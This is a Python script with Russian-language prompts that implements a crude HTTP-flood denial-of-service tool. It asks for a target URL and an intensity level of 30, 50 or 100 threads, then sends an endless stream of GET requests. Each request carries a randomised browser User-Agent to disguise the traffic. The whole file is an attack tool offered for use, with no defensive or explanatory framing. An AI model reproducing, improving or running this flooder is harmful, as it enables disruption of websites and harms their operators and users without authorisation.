#by lavanda
from concurrent.futures import ThreadPoolExecutor
import random
from colorama import init, Fore, Style
import requests

init()

dcyan = Style.NORMAL + Fore.CYAN
cyan = Style.BRIGHT + Fore.CYAN
blueb = Style.BRIGHT + Fore.BLUE
white = Style.BRIGHT + Fore.WHITE
baza = Style.NORMAL

def dos1():
    try:
        def generate_user_agent():
            versions = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.{0}; rv:{1}.0) Gecko/20{2:02d}{3:02d} Firefox/{1}.0",
                "Mozilla/5.0 (X11; Linux x86_64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
            ]

            version = random.randint(60, 90)
            year = random.randint(10, 21)
            month = random.randint(1, 12)

            user_agent = random.choice(versions).format(version, year, year, month)
            return user_agent


        def make_request(url):
            headers = {
                'User-Agent': generate_user_agent()
            }
            response = requests.get(url, headers=headers)
            print(f"\n{dcyan}[{white}!{dcyan}]{cyan} Атака началась, состояние сайта: ", response.status_code)


        def dos():
            url = input(f"\n{dcyan}[{white}?{dcyan}]{cyan} Введите ссылку : ")

            power = input(f"{dcyan}[{white}?{dcyan}]{cyan} Выберите режим (1 - Слабый/2 - Средний/3 - Мощный) : ")

            if power == "1":
                with ThreadPoolExecutor(max_workers=30) as executor:
                    while True:
                        executor.submit(make_request, url)

            elif power == "2":
                with ThreadPoolExecutor(max_workers=50) as executor:
                    while True:
                        executor.submit(make_request, url)

            elif power == "3":
                with ThreadPoolExecutor(max_workers=100) as executor:
                    while True:
                        executor.submit(make_request, url)

            else:
                print(f"\n{dcyan}[{white}!{dcyan}]{cyan} Нет такого режима!")

        dos()
    except:
        print(f'\n{dcyan}[{white}!{dcyan}]{cyan} Произошла ошибка! Проверьте ввод данных!')
